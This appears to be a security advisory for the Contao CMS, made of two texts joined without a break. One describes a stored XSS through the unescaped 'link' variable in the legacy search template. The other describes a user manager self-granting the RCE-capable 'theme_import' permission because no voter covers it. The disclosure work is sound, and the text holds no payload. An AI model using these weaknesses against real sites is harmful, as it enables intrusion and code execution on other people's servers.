Commit `23e8cca3136a` hardened the search-result title against insert-tag/XSS by setting `$objTemplate->title = StringUtil::specialchars(StringUtil::stripInsertTags($arrResult[$i]['title']))`. But the legacy HTML5 template does not use that `title` variable - it prints the raw `link` variable, which is assigned without escaping.

## Impact

Affected configuration (important): on 5.7.9 the default search template is the Twig `search_default.html.twig`, which does not use the raw `link` variable and auto-escapes - so a default Twig install is not affected. The vulnerable raw echo is in the legacy `search_default.html5` template (still shipped and selectable in 5.7.9, line 8: `<?= $this->link ?>`); exploitation requires that legacy template to be active for the search module (common on sites migrated from earlier Contao / using custom template selection). Where the legacy template is used, the sink is unambiguously raw and `ModuleSearch::compile()` assigns `link` from the entity-decoded indexed title.

A backend page editor can store script that executes for anonymous front-end visitors (and admins) viewing search results, a stored XSS crossing the editor -> anonymous-visitor boundary.

## Credits

This security vulnerability was found by @HDWSec

Commit `2b83a60f7763` (5.7.3) hardened the template editor: it added `TemplateEditorModuleVoter` + `CheckTemplateEditorSaveListener` so a non-admin cannot self-grant the `tpl_editor` backend module (editable PHP-capable templates permit server-side code execution). That voter supports only the `modules` field and the literal value `tpl_editor`.

The equally RCE-capable `theme_import` capability lives in a different field - the `themes` checkbox field (tl_user_group.php:98-105 options include `theme_import`; identical on tl_user.php:248-253) - which has no save_callback and no voter. `TemplateEditorModuleVoter` is the only DC voter registered for tl_user_group, and it does not cover the `themes` field. So a delegated user manager can add `theme_import` to their own (or a managed) account.
